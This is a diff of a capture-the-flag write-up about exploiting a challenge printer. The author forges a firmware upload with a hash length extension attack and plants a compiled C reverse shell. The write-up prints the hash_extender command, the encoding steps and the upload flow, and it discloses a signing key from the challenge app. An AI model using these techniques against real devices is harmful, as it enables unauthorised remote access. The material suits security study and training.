@@ -1,24 +1,17 @@
----
-hide:
-  - toc
-  - navigation
----
 # Printer Exploitation
 
 Accessing the printer gives us access to only one thing: Upload and Download the current printer firmware.
 
-![TEMP](img/obj7/img1.png)
+![The Printer Interface](img/obj7/img1.png)
 
 First, let's download the firmware.
 
-![TEMP](img/obj7/img2.png)
+![The Firmware](img/obj7/img2.png)
 
-There was mention of a Hash Length Extension attack, which is beginning to be very clear. This is base64 encoded firmware, so let's decode it.
-
-Decoding it shows...just a blob of data. Some strings in it mention `firmware.binUT`. Googling that shows "Peanut Plug firmware." I think I'm going to try to generate a reverse shell.
+There was mention of a Hash Length Extension attack, which is beginning to make sense here, given the `signature`, `secret_length` and `algorithm` attributes. This is base64 encoded firmware, so let's decode it.
 
 The json object I downloaded:
-![TEMP](img/obj7/img3.png)
+![JSON](img/obj7/img3.png)
 
 The blob of data, when using `file` against it, shows that it is:
 
@@ -34,20 +27,12 @@ Importing and analyzing it allows me to decompile the software into a super simp
 
 ![TEMP](img/obj7/img4.png)
 
-So in theory, it looks like I can just...open a shell. Let's use msfvenom to kick back a reverse shell!
+So in theory, it looks like I can just...open a shell. Let's try to insert our own executable!
 
-First, make a payload:
+## Create a reverse shell in C
 
-![TEMP](img/obj7/img5.png)
+I found the following blurb of C code that I can use to create a reverse shell. I simply chagned the `REMOTE_ADDR` and `REMOTE_PORT` to more relevant data that I can use to catch the shell.
 
-Check to see that it works...
-
-Now let's play with the hash length extender!
-
-
-# Things I did
-
-- Created a hacked shell, using copied C code:
 ```C
 #include <stdio.h>
 #include <unistd.h>
@@ -75,45 +60,27 @@ int main(int argc, char *argv[])
 }
 ```
 
-- Copied to a zip file:
+I compiled the above with `gcc ./revshell.c -o firmware.bin`
 
-![TEMP](img/obj7/img6.png)
+I then added the code to a zip file called `hacked.zip`:
 
-- Created the hash length extension attack
+![TEMP](img/obj7/img5.png)
 
-![TEMP](img/obj7/img7.png)
-
-- Converted the hex string to base64 so I could copy-paste it into the json file
-
-![TEMP](img/obj7/img8.png)
-
-- Editing the payload JSON file
-
-![TEMP](img/obj7/img9.png)
-
-# Enough of this, here is what actually worked.
-
-First, I downloaded the above C reverse shell.
-
-Compiled with:
-
-`gcc -o firmware.bin`
-
-Zipped it with:
-
-`zip hacked firmware.bin`
-
-Now got the hex of the revshell
+At this point, I needed to get the hex value of the reverse shell. With some handy shell-fu I managed to accomplish this with a combination of `xxd` and `tr`:
 
 `xxd -p ./hacked.zip | tr -d "\n"`
 
-Ran it against hash_extender:
+Which, for those of you following at home, took a hex dump of the entire `hacked.zip` file and removed any newline characters, making it one long string of hex characters.
 
-`./hash_extender --file=../orig.zip -s e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23 -f sha256 -l 16 --append-format=hex -a <resulting hash of previous xxd output`
+I then used the output of the above command in combination with the `hash_extender` tool. Using the file I originally downloaded from the printer (that I named `orig.zip`), and the hash from that download as well (`e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23`), I ran the following:
 
-Took the new string output of the above and ran it through this cyberchef recipe to copy it into a base64 blob
+`./hash_extender --file=../orig.zip -s e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23 -f sha256 -l 16 --append-format=hex -a <resulting hash of previous xxd output>`
 
-https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')
+The output looked like this:
+
+![hash_extender output](img/obj7/img6.png)
+
+Took the new string output of the above and ran it through [this cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex\('Auto'\)To_Base64\('A-Za-z0-9%2B/%3D'\)) to copy it into a base64 blob.
 
 Took the output of that, added into the "firmware" portion of this json blob:
 
@@ -128,17 +95,18 @@ Took the output of that, added into the "firmware" portion of this json blob:
 
 Uploaded it to the firmware site, got a success message:
 
-![TEMP](img/obj7/img10.png)
+![TEMP](img/obj7/img7.png)
 
 And a callback!
 
-![TEMP](img/obj7/img11.png)
+![TEMP](img/obj7/img8.png)
 
 SHELL!
 
-A couple of things I discovered on the container:
 
-The printer spool
+## Some discoveries after obtaining a shell
+
+### The printer spool
 ```text
 Documents queued for printing
 =============================
@@ -153,7 +121,11 @@ Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
 Troll_Pay_Chart.xlsx
 ```
 
-The ruby sinatra app that mimicked the printer:
+### The ruby sinatra app that mimicked the printer:
+
+The secret key was: `mybigsigningkey!`
+
+Also there was apparently a secret endpoint for uptime by accessing `/secretendpointforuptime` that apparently just reads the contents of `/tmp/uptime-check.txt`. Could be fun to play with if I could change that file. Oh well. As of right now, that text file simply shows: `follow the white rabbit....`. Is there a white rabbit somewhere? Or is that just a Matrix reference? hmmmmmmmm...
 
 ```ruby
 # encoding: ASCII-8BIT
